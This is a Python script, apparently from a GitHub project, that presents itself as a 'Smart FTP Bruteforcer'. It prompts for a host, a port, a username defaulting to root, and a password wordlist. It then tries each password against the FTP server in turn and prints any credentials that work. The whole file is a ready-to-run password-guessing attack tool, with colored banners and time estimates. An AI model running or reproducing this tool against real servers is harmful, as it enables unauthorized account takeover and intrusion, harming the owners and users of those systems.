import ftplib
import socketserver
import socket
from ftplib import FTP
import ftplib
import sys
from threading import Thread
import queue
import requests
import time
import sys
import os
import whois
import string
from string import punctuation
import random
import zipfile
import urllib
from urllib.request import urlopen
from bs4 import BeautifulSoup
import ftplib
from threading import Thread
import queue

# The Smart FTP Bruteforcer by @Coroxx on github

host = None

user = None

port = None

COLORS = {\
"black":"\u001b[30;1m",
"red": "\u001b[31;1m",
"green":"\u001b[32m",
"yellow":"\u001b[33;1m",
"blue":"\u001b[34;1m",
"magenta":"\u001b[35m",
"cyan": "\u001b[36m",
"white":"\u001b[37m",
"yellow-background":"\u001b[43m",
"black-background":"\u001b[40m",
"cyan-background":"\u001b[46;1m",
}


def colorText(text):
    for color in COLORS:
        text = text.replace("[[" + color + "]]", COLORS[color])
    return text

def banner() : 
    a = open("ftpcrackbanner.txt","r")
    ascii = "".join(a.readlines())
    print (colorText(ascii))

url = "http://www.google.com" #Je définit l'url de test
timeout = 5 # Timeout de 5 secondes 

#Puis le test d'une requête sur l'url
try:
    request = requests.get(url, timeout=timeout)
    print(colorText("[[green]]\n\n[+] Internet : [CONNECTED]\n"))
    print(colorText("[[red]][!] This script must be run on full screen for optimal use. ! "))
    print(colorText("[[red]][!] This script must be run on full screen for optimal use. ! "))
    time.sleep(3)
    os.system('clear')
except (requests.ConnectionError, requests.Timeout) as exception:
    print(colorText('                 [-][[red]]Internet [NOT CONNECTED] '))
    print(colorText('    [[green]] ✘ [[red]] You must be connected to internet to start this script [[green]] ✘'))
    time.sleep(5)
    sys.exit()

def password():
    global wordlist
    wordlist = input(colorText("\n[[cyan]][ ? ] Wordlist (ex wordlist.txt) : "))
    if '.txt' in wordlist :
        print('')
    else : 
        print(colorText("[[red]]\n[-] Wrong format !! Must end with .txt"))
        password()
    print(colorText("[[green]]\n[+] Wordlist has been set to : "), wordlist)
    correct = input(colorText("\n[[yellow]][ ? ] Is it right ? [y/n] "))
    if correct == 'y':
        print('')
    else : 
        password()


def username() :
    global user
    user = input(colorText('[[magenta]]\n[ ? ] Username (Press enter to set to "root") :  '))
    if user == '' :
        user = 'root'
    print (colorText("[[green]]\n[+] Username has been set to : "), user)
    correct = input(colorText("[[yellow]]\n[ ? ] Is it right ? [y/n] "))
    if correct == 'y' : 
        print('')
    else : 
        username()

def hostname() : 
    global host
    host = input(colorText("[[cyan]]\n[ ? ] Hostname (IP Adress or domain) : "))
    if "." in host : 
        print('')
    else : 
        print(colorText("[[red]]\n[!] Wrong format !"))
        hostname()
    print(colorText('[[green]]\nHostname has been set to'), host)
    correct = input(colorText("[[yellow]]\n[!] Is it right ? [y/n] "))
    if correct == 'y' :
        print('')
    else : 
        hostname()

def portt() :
    global port
    try : 
        port = int(input(colorText("[[yellow]]\n[ ? ] Port : ")))
    except ValueError : 
        print(colorText("[[red]][!] Wrong format "))
        portt()
    if port != 21 :
        print(colorText("[[red]]\n[!] Your port isn't 21, maybe the script won't work propely "))
    else : 
        pass
    correct = input(colorText("[[yellow]]\n[!] Is it right ? [y/n] "))
    if correct == 'y' :
        pass
    else : 
        portt()
    



    

def hub(): 
    banner()
    hubchoice1 = input(colorText("[[cyan]]\n[ 1 ] Smart FTP Forcebruter\n[ 2 ] Exit\n\n[ ? ] Choice : "))
    try : 
        val = int(hubchoice1)
    except ValueError : 
        print(colorText("[[red]][-] Wrong choice !!"))
        hub()
    if val >= 3 :
        print(colorText('[[red]] Wrong choice !!'))
    if val == 2 : 
        os.system('sudo python3 smartool.py')
    elif val == 1 : 
        hub1() 

def hub1() :
    password()
    username()
    hostname()
    portt()
    pass



def is_correct(password):
    server = ftplib.FTP()
    print("\n[!] Trying", password)
    try:
        
        server.connect(host, port, timeout=3)
        
        server.login(user, password)
    except (ftplib.error_perm, TimeoutError, socket.timeout):
        
        return False
    else:
        
        print(colorText("[[green]]\n[+] Found credentials !!"))
        print(colorText("\nHostname : "),host,"\nUsername : ",user,"\nPassword : ",password, "\n ")
        return True

hub()

passwords = open(wordlist).read().split("\n")
passwordcount = len(passwords)
minn = 30
hour = 1800
result = passwordcount / hour
result1 = passwordcount / minn
if result > 1800 : 
    hourr = 'hours' 
elif result < 1800 :
    hourr = 'hour'

print(colorText("\n[[green]]Reading password file.\nReading password file..\nReading password file...\n\n[+] Done !\n\n[!] Script have to try "), len(passwords), "passwords",(colorText("[[yellow]]\n\nApproximate time to finish this list : ")), result,hourr,result1 ,"minutes\n\n" )
time.sleep(2)



for password in passwords:
    if is_correct(password):
        break